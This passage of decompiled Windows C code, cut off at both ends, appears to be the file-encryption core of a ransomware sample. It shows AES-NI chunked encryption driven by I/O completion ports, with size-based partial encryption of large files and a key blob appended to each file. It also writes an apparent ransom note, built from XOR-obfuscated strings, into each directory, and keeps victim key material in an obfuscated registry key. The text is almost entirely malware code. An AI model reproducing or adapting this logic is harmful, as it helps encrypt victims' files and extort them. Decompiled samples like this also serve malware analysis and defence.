// 4196C0: using guessed type __int128 xmmword_4196C0;
// 41D318: using guessed type char byte_41D318;
// 410610: using guessed type char var_198[8];
// 410610: using guessed type char var_178[4];
// 410610: using guessed type size_t var_2C;

//----- (00410CE0) --------------------------------------------------------
int __thiscall sub_410CE0(const void *this)
{
  unsigned int v1; // ecx
  HANDLE FileW; // eax
  void *v3; // edi
  struct _OVERLAPPED *v4; // eax
  struct _OVERLAPPED *v5; // esi
  LPCVOID v7; // [esp-10h] [ebp-248h]
  DWORD v8; // [esp-Ch] [ebp-244h]
  WCHAR pszPath[262]; // [esp+8h] [ebp-230h] BYREF
  __int128 v10; // [esp+215h] [ebp-23h] BYREF
  int v11; // [esp+225h] [ebp-13h]
  char v12[3]; // [esp+229h] [ebp-Fh] BYREF
  _DWORD v13[2]; // [esp+22Ch] [ebp-Ch] BYREF
  __int16 v14; // [esp+234h] [ebp-4h]

  qmemcpy(pszPath, this, 0x208u);
  PathRemoveFileSpecW(pszPath);
  v1 = 0;
  v10 = xmmword_419470;
  v11 = 1476550473;
  strcpy(v12, "TX");
  do
    *((_BYTE *)&v10 + ++v1) ^= v10;
  while ( v1 < 0x15 );
  v12[2] = 0;
  v14 = 0;
  v13[0] = 7536677;
  v13[1] = 5439525;
  wsprintfW(pszPath, (LPCWSTR)v13, pszPath, (char *)&v10 + 1);
  FileW = CreateFileW(pszPath, 0x40000000u, 0, 0, 1u, 0x50000000u, 0);
  v3 = FileW;
  if ( FileW == (HANDLE)-1 )
    return 0;
  ExistingCompletionPort = CreateIoCompletionPort(FileW, ExistingCompletionPort, 0, NumberOfConcurrentThreads);
  if ( ExistingCompletionPort == (HANDLE)-1 || (v4 = (struct _OVERLAPPED *)malloc(0x40068u), (v5 = v4) == 0) )
  {
LABEL_9:
    CloseHandle(v3);
    return 0;
  }
  v8 = nNumberOfBytesToWrite;
  v4[1].hEvent = HANDLE_FLAG_PROTECT_FROM_CLOSE|HANDLE_FLAG_INHERIT;
  v7 = lpBuffer;
  v4->Offset = 0;
  v4->OffsetHigh = 0;
  v4->hEvent = 0;
  v4[1].OffsetHigh = (DWORD)v3;
  if ( !WriteFile(v3, v7, v8, 0, v4) && GetLastError() != 997 )
  {
    free(v5);
    goto LABEL_9;
  }
  return 1;
}
// 419470: using guessed type __int128 xmmword_419470;

//----- (00410E30) --------------------------------------------------------
void __stdcall __noreturn sub_410E30(PVOID Parameter)
{
  void (__stdcall *v1)(HANDLE); // edi
  BOOL QueuedCompletionStatus; // eax
  LPOVERLAPPED v3; // esi
  HANDLE hEvent; // eax
  DWORD v5; // edi
  DWORD v7; // edx
  __m128i *v8; // eax
  unsigned int v15; // ecx
  struct _OVERLAPPED *InternalHigh; // ecx
  __int128 v27; // xmm0
  int Offset; // edx
  __int64 v29; // kr00_8
  __int64 v30; // rax
  ULONG_PTR Internal; // edi
  __int64 v32; // rax
  ULONG_PTR v33; // eax
  ULONG_PTR v34; // edi
  __int64 v35; // rax
  ULONG_PTR v36; // edi
  unsigned int v37; // eax
  int v38; // edx
  bool v39; // cf
  __int64 v40; // rax
  unsigned int v41; // eax
  int v42; // edx
  __int64 v43; // rax
  __int64 v44; // rax
  unsigned int v45; // ecx
  DWORD *p_OffsetHigh; // ecx
  BYTE *v47; // edx
  unsigned int v48; // edi
  DWORD v49; // edi
  int v50; // edx
  ULONG_PTR v51; // eax
  char v52; // cl
  int v53; // eax
  char v54; // cl
  int v55; // eax
  size_t v56; // edi
  int v57; // ecx
  __int128 *v58; // eax
  unsigned int v59; // eax
  BOOL File; // eax
  ULONG_PTR v61; // edx
  DWORD v62; // ecx
  ULONG_PTR v63; // edi
  int v64; // eax
  bool v65; // sf
  bool v66; // cc
  DWORD v67; // ecx
  ULONG_PTR v68; // eax
  void *OffsetHigh; // [esp-14h] [ebp-364h]
  unsigned __int64 v70; // [esp-10h] [ebp-360h]
  DWORD v71; // [esp+8h] [ebp-348h]
  int v72; // [esp+8h] [ebp-348h]
  unsigned int v73; // [esp+Ch] [ebp-344h]
  unsigned int v74; // [esp+10h] [ebp-340h]
  unsigned int v75; // [esp+14h] [ebp-33Ch]
  unsigned int v76; // [esp+18h] [ebp-338h]
  DWORD NumberOfBytesTransferred; // [esp+1Ch] [ebp-334h] BYREF
  unsigned int v78; // [esp+20h] [ebp-330h]
  LPOVERLAPPED lpOverlapped; // [esp+24h] [ebp-32Ch]
  LPOVERLAPPED Overlapped; // [esp+28h] [ebp-328h] BYREF
  unsigned int CompletionKey; // [esp+2Ch] [ebp-324h] BYREF
  __m128i v82; // [esp+30h] [ebp-320h] BYREF
  BYTE pbBuffer[16]; // [esp+40h] [ebp-310h] BYREF
  __m128i v84[20]; // [esp+50h] [ebp-300h] BYREF
  __int128 Src[2]; // [esp+198h] [ebp-1B8h] BYREF
  char v86[128]; // [esp+1B8h] [ebp-198h] BYREF
  int v87[70]; // [esp+238h] [ebp-118h] BYREF

  v1 = (void (__stdcall *)(HANDLE))CloseHandle;
  while ( 1 )
  {
    while ( 1 )
    {
      while ( 1 )
      {
        while ( 1 )
        {
          while ( 1 )
          {
            do
            {
              QueuedCompletionStatus = GetQueuedCompletionStatus(
                                         ExistingCompletionPort,
                                         &NumberOfBytesTransferred,
                                         &CompletionKey,
                                         &Overlapped,
                                         0xFFFFFFFF);
              v3 = Overlapped;
              lpOverlapped = Overlapped;
            }
            while ( !QueuedCompletionStatus && !Overlapped );
            hEvent = Overlapped[1].hEvent;
            if ( hEvent != HANDLE_FLAG_INHERIT )
              break;
            v5 = NumberOfBytesTransferred;
            _XMM4 = *(__m128i *)&Overlapped[13111].Offset;
            v71 = NumberOfBytesTransferred & 0xF;
            v82 = _XMM4;
            if ( dword_41D32C )
            {
              sub_408600((int)v84, (__m128i *)&Overlapped[13109].hEvent);
            }
            else
            {
              sub_401D00(v87);
              sub_401D20(v87, (unsigned __int8 *)&v3[13109].hEvent, 128);
              v5 = NumberOfBytesTransferred;
              _XMM4 = v82;
            }
            v7 = v71;
            if ( v5 != 0x40000 && v71 )
            {
              v7 = 16 - v71;
              v71 = 16 - v71;
            }
            v8 = (__m128i *)(&v3[2].Pointer + 1);
            if ( dword_41D32C )
            {
              if ( !(v7 + v5) )
                goto LABEL_19;
              _XMM1 = v84[10];
              _XMM2 = v84[9];
              _XMM3 = v84[8];
              _XMM5 = v84[7];
              _XMM6 = v84[6];
              _XMM7 = v84[5];
              v15 = ((v7 + v5 - 1) >> 4) + 1;
              do
              {
                ++v8;
                _XMM4 = _mm_xor_si128(_mm_xor_si128(_XMM4, v8[-1]), v84[0]);
                __asm
                {
                  aesenc  xmm4, [esp+350h+var_2F0]
                  aesenc  xmm4, [esp+350h+var_2E0]
                  aesenc  xmm4, [esp+350h+var_2D0]
                  aesenc  xmm4, [esp+350h+var_2C0]
                  aesenc  xmm4, xmm7
                  aesenc  xmm4, xmm6
                  aesenc  xmm4, xmm5
                  aesenc  xmm4, xmm3
                  aesenc  xmm4, xmm2
                  aesenclast xmm4, xmm1
                }
                v8[-1] = _XMM4;
                --v15;
              }
              while ( v15 );
LABEL_18:
              v5 = NumberOfBytesTransferred;
LABEL_19:
              if ( v3[2].Offset )
              {
                InternalHigh = (struct _OVERLAPPED *)v3[1].InternalHigh;
                v27 = *(_OWORD *)((char *)&v3[1].hEvent + v7 + v5);
                Offset = v3[1].Offset;
                v3->Offset = v3[2].Internal;
                v3->OffsetHigh = v3[2].InternalHigh;
                v3[1].hEvent = (HANDLE)5;
                lpOverlapped = InternalHigh;
                v78 = Offset;
                *(_OWORD *)&v3[13111].Offset = v27;
                if ( __SPAIR64__(Offset, (unsigned int)InternalHigh) < 6291456 )
                {
                  v29 = *(_QWORD *)&v3[2].Internal + 0x40000i64;
                  if ( SHIDWORD(v29) >= Offset )
                  {
                    if ( SHIDWORD(v29) <= Offset )
                    {
                      if ( (unsigned int)v29 >= (unsigned int)InternalHigh )
                        v3[1].hEvent = HANDLE_FLAG_PROTECT_FROM_CLOSE;
                      goto LABEL_36;
                    }
LABEL_47:
                    v3[1].hEvent = HANDLE_FLAG_PROTECT_FROM_CLOSE;
                  }
LABEL_36:
                  v7 = v71;
                  *(_QWORD *)&v3[2].Internal += v71 + NumberOfBytesTransferred;
                  goto LABEL_37;
                }
                if ( __PAIR64__(Offset, (unsigned int)InternalHigh) - 6291457 <= 0x2BFFFFE )
                {
                  LODWORD(v30) = sub_4010E0(__PAIR64__(Offset, (unsigned int)InternalHigh) - 1572864, 4i64);
                  v76 = HIDWORD(v30);
                  v74 = v30;
                  Internal = v3[2].Internal;
                  LODWORD(v32) = sub_4010E0(*(_QWORD *)&v3[2].Internal, v30 + 0x40000);
                  if ( v32 < 3 )
                  {
                    v33 = (__PAIR64__(v76, v74) + __PAIR64__(v3[2].InternalHigh, Internal)) >> 32;
                    v34 = v74 + Internal;
LABEL_35:
                    v3[2].InternalHigh = v33;
                    v3[2].Internal = v34;
                    goto LABEL_36;
                  }
LABEL_46:
                  v45 = v78;
                  v39 = (unsigned int)lpOverlapped < 0x40000;
                  v3[2].Internal = (ULONG_PTR)&lpOverlapped[-13108].hEvent;
                  v3[2].InternalHigh = v45 - v39;
                  goto LABEL_47;
                }
                if ( __PAIR64__(Offset, (unsigned int)InternalHigh) - 52428801 > 0x31FFFFE )
                {
                  if ( __PAIR64__(Offset, (unsigned int)InternalHigh) - 104857601 > 0x18FFFFFE )
                  {
                    if ( __SPAIR64__(Offset, (unsigned int)InternalHigh) <= 524288000 )
                      goto LABEL_36;
                    LODWORD(v43) = sub_4010E0(__PAIR64__(Offset, (unsigned int)InternalHigh) - 13107200, 48i64);
                    v73 = HIDWORD(v43);
                    v75 = v43;
                    v36 = v3[2].Internal;
                    LODWORD(v44) = sub_4010E0(*(_QWORD *)&v3[2].Internal, v43 + 0x40000);
                    if ( v44 >= 47 )
                      goto LABEL_46;
                  }
                  else
                  {
                    LODWORD(v40) = sub_4010E0(__PAIR64__(Offset, (unsigned int)InternalHigh) - 3670016, 12i64);
                    v73 = HIDWORD(v40);
                    v75 = v40;
                    v36 = v3[2].Internal;
                    v41 = sub_4010E0(*(_QWORD *)&v3[2].Internal, v40 + 0x40000);
                    if ( v42 > 0 )
                      goto LABEL_46;
                    if ( v42 >= 0 )
                    {
                      v39 = v41 < 0xB;
                      goto LABEL_33;
                    }
                  }
                }
                else
                {
                  LODWORD(v35) = sub_4010E0(__PAIR64__(Offset, (unsigned int)InternalHigh) - 0x200000, 6i64);
                  v73 = HIDWORD(v35);
                  v75 = v35;
                  v36 = v3[2].Internal;
                  v37 = sub_4010E0(*(_QWORD *)&v3[2].Internal, v35 + 0x40000);
                  if ( v38 > 0 )
                    goto LABEL_46;
                  if ( v38 >= 0 )
                  {
                    v39 = v37 < 5;
LABEL_33:
                    if ( !v39 )
                      goto LABEL_46;
                  }
                }
                v33 = (__PAIR64__(v73, v75) + __PAIR64__(v3[2].InternalHigh, v36)) >> 32;
                v34 = v75 + v36;
                goto LABEL_35;
              }
              v3->Offset = 0;
              v3->OffsetHigh = 0;
              v3[1].hEvent = HANDLE_FLAG_PROTECT_FROM_CLOSE;
LABEL_37:
              v1 = (void (__stdcall *)(HANDLE))CloseHandle;
              if ( !WriteFile((HANDLE)v3[1].OffsetHigh, &v3[2].Pointer + 1, v7 + NumberOfBytesTransferred, 0, v3)
                && GetLastError() != 997 )
              {
                _InterlockedDecrement(&dword_41D330);
                CloseHandle((HANDLE)v3[1].OffsetHigh);
                free(v3);
              }
            }
            else
            {
              if ( !sub_401BE0(
                      v87,
                      1,
                      v7 + v5,
                      &v82,
                      (__m128i *)(&v3[2].Pointer + 1),
                      (unsigned __int8 *)&v3[2].Pointer + 4) )
              {
                v7 = v71;
                goto LABEL_18;
              }
LABEL_56:
              _InterlockedDecrement(&dword_41D330);
              v1 = (void (__stdcall *)(HANDLE))CloseHandle;
              CloseHandle((HANDLE)v3[1].OffsetHigh);
              free(v3);
            }
          }
          if ( hEvent != HANDLE_FLAG_PROTECT_FROM_CLOSE )
            break;
          SetFileTime((HANDLE)Overlapped[1].OffsetHigh, &FileTime, &FileTime, &FileTime);
          v1((HANDLE)v3[1].OffsetHigh);
          _InterlockedDecrement(&dword_41D330);
          memset(&v3[13109].hEvent, 0, 0x30u);
          free(v3);
        }
        if ( hEvent != HANDLE_FLAG_PROTECT_FROM_CLOSE|HANDLE_FLAG_INHERIT )
          break;
        SetFileTime((HANDLE)Overlapped[1].OffsetHigh, &FileTime, &FileTime, &FileTime);
        v1((HANDLE)v3[1].OffsetHigh);
        free(v3);
      }
      if ( hEvent != (HANDLE)4 )
        break;
      p_OffsetHigh = &Overlapped[2].OffsetHigh;
      v47 = ::Src;
      v48 = 12;
      while ( *p_OffsetHigh == *(_DWORD *)v47 )
      {
        ++p_OffsetHigh;
        v47 += 4;
        v39 = v48 < 4;
        v48 -= 4;
        if ( v39 )
          goto LABEL_56;
      }
      Overlapped->Offset = Overlapped[1].InternalHigh;
      v49 = v3[1].Offset;
      HIDWORD(v70) = v49;
      LODWORD(v70) = v3[1].InternalHigh;
      v3->OffsetHigh = v49;
      v50 = sub_4011D0(v70, 16i64);
      v51 = v3[1].InternalHigh;
      v52 = v51;
      if ( !v3[2].Offset && __SPAIR64__(v49, v51) > 0x40000 )
      {
        v50 = 0;
        v52 = v51;
      }
      v53 = 16 - v50;
      if ( v50 <= 0 )
        v53 = v50;
      v54 = v52 & 0xF;
      HIBYTE(v3[13111].InternalHigh) = v54;
      v72 = v53;
      if ( !v3[2].Offset && *(__int64 *)&v3[1].InternalHigh > 0x40000 )
        HIBYTE(v3[13111].InternalHigh) = v54 & 0xF0;
      *(_OWORD *)&v3[13111].Offset = *(_OWORD *)(&v3[13110].Pointer + 1);
      sub_40A5A0(pbBuffer, 0x10u);
      if ( dword_41D324 )
      {
        v55 = sub_401A80((int)dword_41C950, pbBuffer, 0x10u);
      }
      else
      {
        sub_401970(dword_41C950);
        sub_401610(dword_41CF90);
        dword_41D324 = 1;
        v55 = sub_401B70(dword_41C950, (int)sub_4014E0, (int)dword_41CF90, pbBuffer, 0x10u);
      }
      if ( v55
        || (v56 = Size,
            Src[0] = *(_OWORD *)&v3[13109].hEvent,
            Src[1] = *(_OWORD *)(&v3[13110].Pointer + 1),
            memcpy(v86, &unk_41D198, Size),
            v78 = (unsigned int)v3 + v72,
            sub_406A80(
              dword_41D220,
              (void (__cdecl *)(int, unsigned int, unsigned int))sub_401990,
              (int)dword_41C950,
              0,
              v56 + 32,
              Src,
              (char *)&v3[2].Pointer + v72 + 4)) )
      {
        _InterlockedDecrement(&dword_41D330);
        v1 = (void (__stdcall *)(HANDLE))CloseHandle;
        CloseHandle((HANDLE)v3[1].OffsetHigh);
        free(v3);
      }
      else
      {
        v57 = 32;
        v58 = Src;
        do
        {
          *(_BYTE *)v58 = 0;
          v58 = (__int128 *)((char *)v58 + 1);
          --v57;
        }
        while ( v57 );
        v59 = v78;
        qmemcpy((void *)(v78 + 308), &Data, 0x500u);
        v3 = lpOverlapped;
        v1 = (void (__stdcall *)(HANDLE))CloseHandle;
        *(_OWORD *)(v59 + 1588) = *(_OWORD *)::Src;
      }
      v3[1].hEvent = (HANDLE)6;
      File = WriteFile((HANDLE)v3[1].OffsetHigh, &v3[2].Pointer + 1, v72 + 1552, 0, v3);
LABEL_89:
      if ( !File && GetLastError() != 997 )
      {
        _InterlockedDecrement(&dword_41D330);
        v1((HANDLE)v3[1].OffsetHigh);
        free(v3);
      }
    }
    if ( hEvent == (HANDLE)5 )
    {
      v61 = Overlapped[2].Internal;
      v62 = 0x40000;
      v63 = Overlapped[1].InternalHigh;
      Overlapped[1].hEvent = HANDLE_FLAG_INHERIT;
      v78 = v61 + 0x40000;
      v64 = __CFADD__(v61, 0x40000) + v3[2].InternalHigh;
      if ( (signed int)v3[1].Offset <= v64 && ((signed int)v3[1].Offset < v64 || v63 <= v78) )
        v62 = v63 - v61;
      v3->OffsetHigh = v3[2].InternalHigh;
      OffsetHigh = (void *)v3[1].OffsetHigh;
      v3->Offset = v61;
      v1 = (void (__stdcall *)(HANDLE))CloseHandle;
      if ( !ReadFile(OffsetHigh, &v3[2].Pointer + 1, v62, 0, v3) && GetLastError() != 997 )
        goto LABEL_56;
    }
    else if ( hEvent == (HANDLE)6 )
    {
      v65 = (Overlapped[1].Offset & 0x80000000) != 0;
      v66 = (signed int)Overlapped[1].Offset <= 0;
      v67 = 0x40000;
      v68 = Overlapped[1].InternalHigh;
      Overlapped[1].hEvent = HANDLE_FLAG_INHERIT;
      v3->Offset = 0;
      v3->OffsetHigh = 0;
      if ( v66 && (v65 || v68 < 0x40000) )
        v67 = v68;
      File = ReadFile((HANDLE)v3[1].OffsetHigh, &v3[2].Pointer + 1, v67, 0, v3);
      goto LABEL_89;
    }
  }
}
// 411225: conditional instruction was optimized away because edx.4>=0
// 41109D: variable 'v30' is possibly undefined
// 4110CA: variable 'v32' is possibly undefined
// 411118: variable 'v35' is possibly undefined
// 41113A: variable 'v38' is possibly undefined
// 4111F1: variable 'v40' is possibly undefined
// 411213: variable 'v42' is possibly undefined
// 411251: variable 'v43' is possibly undefined
// 41127E: variable 'v44' is possibly undefined
// 41B000: using guessed type BYTE Src[256];
// 41C950: using guessed type _DWORD dword_41C950[80];
// 41CF90: using guessed type _DWORD dword_41CF90[129];
// 41D220: using guessed type int dword_41D220[43];
// 41D324: using guessed type int dword_41D324;
// 41D32C: using guessed type int dword_41D32C;
// 41D330: using guessed type int dword_41D330;
// 410E30: using guessed type int var_118[70];
// 410E30: using guessed type char var_198[128];

//----- (00411790) --------------------------------------------------------
int sub_411790()
{
  int i; // edi
  unsigned int v1; // eax
  LSTATUS v2; // esi
  LSTATUS v3; // eax
  unsigned int v4; // ecx
  unsigned int v5; // ecx
  unsigned int v6; // ecx
  unsigned int v7; // ecx
  char v8; // bl
  int v9; // eax
  char v10; // bh
  int v11; // ecx
  void *v12; // edi
  size_t v13; // esi
  int v14; // edx
  int j; // ecx
  int k; // eax
  CHAR v17; // al
  int v18; // edx
  int m; // ecx
  int n; // eax
  CHAR v21; // al
  LPSTR v22; // eax
  char *v23; // ecx
  __int128 v24; // xmm0
  size_t v25; // eax
  size_t v26; // esi
  int v27; // eax
  int v29[130]; // [esp+10h] [ebp-770h] BYREF
  char v30[323]; // [esp+218h] [ebp-568h] BYREF
  __int128 v31[32]; // [esp+35Bh] [ebp-425h] BYREF
  char v32[6]; // [esp+55Bh] [ebp-225h] BYREF
  _OWORD v33[23]; // [esp+561h] [ebp-21Fh] BYREF
  int v34; // [esp+6D1h] [ebp-AFh]
  int v35; // [esp+6D5h] [ebp-ABh]
  int v36; // [esp+6D9h] [ebp-A7h]
  char v37[15]; // [esp+6DDh] [ebp-A3h] BYREF
  int v38[3]; // [esp+6ECh] [ebp-94h] BYREF
  CHAR pszString[52]; // [esp+6F8h] [ebp-88h] BYREF
  DWORD dwDisposition; // [esp+72Ch] [ebp-54h] BYREF
  DWORD Type; // [esp+730h] [ebp-50h] BYREF
  char v42[41]; // [esp+737h] [ebp-49h] BYREF
  DWORD pcchString; // [esp+760h] [ebp-20h] BYREF
  DWORD cbData; // [esp+764h] [ebp-1Ch] BYREF
  HKEY phkResult; // [esp+768h] [ebp-18h] BYREF
  char v46[8]; // [esp+76Eh] [ebp-12h] BYREF
  _WORD v47[5]; // [esp+776h] [ebp-Ah] BYREF

  *(_DWORD *)&v47[3] = malloc(0x483u);
  for ( i = 0; ; i = 1 )
  {
    v1 = 0;
    strcpy(&v42[19], "\x1BHT]OLZI^GWtxpYro");
    do
    {
      v42[v1 + 20] ^= v42[19];
      ++v1;
    }
    while ( v1 < 0x10 );
    v42[36] = 0;
    if ( RegCreateKeyExA(HKEY_CURRENT_USER, &v42[20], 0, 0, 0, 0xF003Fu, 0, &phkResult, &dwDisposition) )
    {
      v5 = 0;
      *(_OWORD *)&v42[13] = xmmword_4197A0;
      strcpy(&v42[29], "de+`nrx");
      do
      {
        v42[v5 + 14] ^= v42[13];
        ++v5;
      }
      while ( v5 < 0x16 );
      v42[36] = 0;
      sub_4100C0(&v42[14]);
      if ( sub_412270((char **)&v47[3]) )
      {
        *(_DWORD *)&v42[37] = 1155;
        if ( sub_4120A0(*(char **)&v47[3], (int *)&v42[37]) )
          goto LABEL_20;
      }
      return 0;
    }
    strcpy((char *)v47, "=full");
    Type = 3;
    cbData = 1280;
    v2 = RegQueryValueExA(phkResult, (LPCSTR)v47 + 1, 0, &Type, Data, &cbData);
    cbData = 259;
    strcpy(v46, "5Public");
    v3 = RegQueryValueExA(phkResult, &v46[1], 0, &Type, *(LPBYTE *)&v47[3], &cbData);
    if ( !v2 && !v3 )
    {
      v4 = 0;
      strcpy(v42, "\n*Mo~~cdm*yoyyced*aosy*lxeg*xomcy~xs");
      do
        v42[++v4] ^= v42[0];
      while ( v4 < 0x23 );
      v42[36] = 0;
      sub_4100C0(&v42[1]);
      RegCloseKey(phkResult);
      goto LABEL_20;
    }
    if ( dwDisposition != 2 || i )
      break;
    Sleep(0x2710u);
  }
  if ( !sub_412270((char **)&v47[3]) )
    return 0;
  *(_DWORD *)&v42[37] = 1155;
  if ( !sub_4120A0(*(char **)&v47[3], (int *)&v42[37]) )
    return 0;
  strcpy((char *)v47, "nfull");
  RegSetValueExA(phkResult, (LPCSTR)v47 + 1, 0, 3u, Data, 0x500u);
  strcpy(v46, "NPublic");
  RegSetValueExA(phkResult, &v46[1], 0, 3u, *(const BYTE **)&v47[3], 0x103u);
  RegCloseKey(phkResult);
LABEL_20:
  sub_404760(&v37[3]);
  sub_404760(v38);
  sub_406A50(dword_41D220, 0, 0);
  if ( sub_405360((int)&v37[3], *(void **)&v47[3], 0x100u)
    || sub_405360((int)v38, (void *)(*(_DWORD *)&v47[3] + 256), 3u)
    || sub_4069A0((int)dword_41D220, (int)&v37[3], 0, 0, 0, (int)v38) )
  {
    return 0;
  }
  sub_401970(v30);
  sub_401610(v29);
  v33[0] = xmmword_419080;
  v6 = 0;
  v34 = 319817738;
  v33[1] = xmmword_419170;
  v35 = 290460937;
  v33[2] = xmmword_4190D0;
  v36 = 269555472;
  v33[3] = xmmword_4190F0;
  strcpy(v37, "QA");
  v33[4] = xmmword_4190B0;
  v33[5] = xmmword_419090;
  v33[6] = xmmword_419740;
  v33[7] = xmmword_4190E0;
  v33[8] = xmmword_4193F0;
  v33[9] = xmmword_419440;
  v33[10] = xmmword_419130;
  v33[11] = xmmword_419750;
  v33[12] = xmmword_419150;
  v33[13] = xmmword_419290;
  v33[14] = xmmword_4192B0;
  v33[15] = xmmword_4191A0;
  v33[16] = xmmword_419730;
  v33[17] = xmmword_419190;
  v33[18] = xmmword_419180;
  v33[19] = xmmword_419020;
  v33[20] = xmmword_419160;
  v33[21] = xmmword_419210;
  v33[22] = xmmword_419520;
  do
    *((_BYTE *)v33 + ++v6) ^= LOBYTE(v33[0]);
  while ( v6 < 0x17D );
  v7 = 0;
  v31[0] = xmmword_4195F0;
  v37[2] = 0;
  v31[1] = xmmword_4199C0;
  strcpy(v32, "\\_RHI");
  v31[2] = xmmword_419990;
  v31[3] = xmmword_4194E0;
  v31[4] = xmmword_419530;
  v31[5] = xmmword_4199B0;
  v31[6] = xmmword_4192C0;
  v31[7] = xmmword_419300;
  v31[8] = xmmword_4191D0;
  v31[9] = xmmword_4192D0;
  v31[10] = xmmword_4196D0;
  v31[11] = xmmword_4196F0;
  v31[12] = xmmword_419710;
  v31[13] = xmmword_419700;
  v31[14] = xmmword_419760;
  v31[15] = xmmword_4192F0;
  v31[16] = xmmword_419680;
  v31[17] = xmmword_4195B0;
  v31[18] = xmmword_419650;
  v31[19] = xmmword_4194F0;
  v31[20] = xmmword_4196A0;
  v31[21] = xmmword_419620;
  v31[22] = xmmword_4196B0;
  v31[23] = xmmword_419580;
  v31[24] = xmmword_419540;
  v31[25] = xmmword_419820;
  v31[26] = xmmword_4196E0;
  v31[27] = xmmword_4195A0;
  v31[28] = xmmword_419560;
  v31[29] = xmmword_419670;
  v31[30] = xmmword_419600;
  v31[31] = xmmword_4191C0;
  do
    *((_BYTE *)v31 + ++v7) ^= LOBYTE(v31[0]);
  while ( v7 < 0x204 );
  v8 = BYTE1(v33[0]);
  v9 = 0;
  v32[5] = 0;
  if ( BYTE1(v33[0]) )
  {
    do
      ++v9;
    while ( *((_BYTE *)v33 + v9 + 1) );
  }
  v10 = BYTE1(v31[0]);
  v11 = 0;
  if ( BYTE1(v31[0]) )
  {
    do
      ++v11;
    while ( *((_BYTE *)v31 + v11 + 1) );
  }
  nNumberOfBytesToWrite = v11 + 500 + v9;
  v12 = malloc(nNumberOfBytesToWrite);
  lpBuffer = v12;
  memset(v12, 0, nNumberOfBytesToWrite);
  v13 = 0;
  if ( v8 )
  {
    do
      ++v13;
    while ( *((_BYTE *)v33 + v13 + 1) );
  }
  memcpy(v12, (char *)v33 + 1, v13);
  pcchString = 50;
  if ( !CryptBinaryToStringA(Src, 8u, 4u, pszString, &pcchString) )
    return 0;
  v14 = 0;
  for ( j = 0; ; ++j )
  {
    for ( k = 0; pszString[k]; ++k )
      ;
    if ( j >= k )
      break;
    v17 = pszString[j];
    if ( v17 != 32 && v17 != 9 )
      pszString[v14++] = v17;
  }
  pszString[v14] = 0;
  *(_OWORD *)((char *)lpBuffer + v13) = *(_OWORD *)CharUpperA(pszString);
  pcchString = 50;
  if ( !CryptBinaryToStringA(*(const BYTE **)&v47[3], 8u, 4u, pszString, &pcchString) )
    return 0;
  v18 = 0;
  for ( m = 0; ; ++m )
  {
    for ( n = 0; pszString[n]; ++n )
      ;
    if ( m >= n )
      break;
    v21 = pszString[m];
    if ( v21 != 32 && v21 != 9 )
      pszString[v18++] = v21;
  }
  pszString[v18] = 0;
  v22 = CharUpperA(pszString);
  v23 = (char *)lpBuffer;
  v24 = *(_OWORD *)v22;
  v25 = 0;
  *(_OWORD *)((char *)lpBuffer + v13 + 16) = v24;
  v26 = v13 + 32;
  if ( v10 )
  {
    do
      ++v25;
    while ( *((_BYTE *)v31 + v25 + 1) );
  }
  memcpy(&v23[v26], (char *)v31 + 1, v25);
  v27 = 0;
  if ( v10 )
  {
    do
      ++v27;
    while ( *((_BYTE *)v31 + v27 + 1) );
  }
  nNumberOfBytesToWrite = v26 + v27;
  free(*(void **)&v47[3]);
  return 1;
}
// 419020: using guessed type __int128 xmmword_419020;
// 419080: using guessed type __int128 xmmword_419080;
// 419090: using guessed type __int128 xmmword_419090;
// 4190B0: using guessed type __int128 xmmword_4190B0;
// 4190D0: using guessed type __int128 xmmword_4190D0;
// 4190E0: using guessed type __int128 xmmword_4190E0;
// 4190F0: using guessed type __int128 xmmword_4190F0;
// 419130: using guessed type __int128 xmmword_419130;
// 419150: using guessed type __int128 xmmword_419150;
// 419160: using guessed type __int128 xmmword_419160;
// 419170: using guessed type __int128 xmmword_419170;
// 419180: using guessed type __int128 xmmword_419180;
// 419190: using guessed type __int128 xmmword_419190;
// 4191A0: using guessed type __int128 xmmword_4191A0;
// 4191C0: using guessed type __int128 xmmword_4191C0;
// 4191D0: using guessed type __int128 xmmword_4191D0;
// 419210: using guessed type __int128 xmmword_419210;
// 419290: using guessed type __int128 xmmword_419290;
// 4192B0: using guessed type __int128 xmmword_4192B0;
// 4192C0: using guessed type __int128 xmmword_4192C0;
// 4192D0: using guessed type __int128 xmmword_4192D0;
// 4192F0: using guessed type __int128 xmmword_4192F0;
// 419300: using guessed type __int128 xmmword_419300;
// 4193F0: using guessed type __int128 xmmword_4193F0;
// 419440: using guessed type __int128 xmmword_419440;
// 4194E0: using guessed type __int128 xmmword_4194E0;
// 4194F0: using guessed type __int128 xmmword_4194F0;
// 419520: using guessed type __int128 xmmword_419520;
// 419530: using guessed type __int128 xmmword_419530;
// 419540: using guessed type __int128 xmmword_419540;
// 419560: using guessed type __int128 xmmword_419560;
// 419580: using guessed type __int128 xmmword_419580;
// 4195A0: using guessed type __int128 xmmword_4195A0;
// 4195B0: using guessed type __int128 xmmword_4195B0;
// 4195F0: using guessed type __int128 xmmword_4195F0;
// 419600: using guessed type __int128 xmmword_419600;
// 419620: using guessed type __int128 xmmword_419620;
// 419650: using guessed type __int128 xmmword_419650;
// 419670: using guessed type __int128 xmmword_419670;
// 419680: using guessed type __int128 xmmword_419680;
// 4196A0: using guessed type __int128 xmmword_4196A0;
// 4196B0: using guessed type __int128 xmmword_4196B0;
// 4196D0: using guessed type __int128 xmmword_4196D0;
// 4196E0: using guessed type __int128 xmmword_4196E0;
// 4196F0: using guessed type __int128 xmmword_4196F0;
// 419700: using guessed type __int128 xmmword_419700;
// 419710: using guessed type __int128 xmmword_419710;
// 419730: using guessed type __int128 xmmword_419730;
// 419740: using guessed type __int128 xmmword_419740;
// 419750: using guessed type __int128 xmmword_419750;
// 419760: using guessed type __int128 xmmword_419760;
// 4197A0: using guessed type __int128 xmmword_4197A0;
// 419820: using guessed type __int128 xmmword_419820;
// 419990: using guessed type __int128 xmmword_419990;
// 4199B0: using guessed type __int128 xmmword_4199B0;
// 4199C0: using guessed type __int128 xmmword_4199C0;
// 41B000: using guessed type BYTE Src[256];
// 41CA90: using guessed type BYTE Data[1280];
// 41D220: using guessed type int dword_41D220[43];
// 411790: using guessed type char var_568[323];
// 411790: using guessed type int var_770[130];
// 411790: using guessed type CHAR pszString[52];

//----- (004120A0) --------------------------------------------------------
int __fastcall sub_4120A0(char *Src, int *a2)
{
  int v4; // edx
  int v5; // esi
  size_t v6; // ebx
  unsigned int v7; // eax
  unsigned int v8; // edx
  int v10[130]; // [esp+10h] [ebp-3D8h] BYREF
  char v11[320]; // [esp+218h] [ebp-1D0h] BYREF
  BYTE pbBuffer[104]; // [esp+358h] [ebp-90h] BYREF
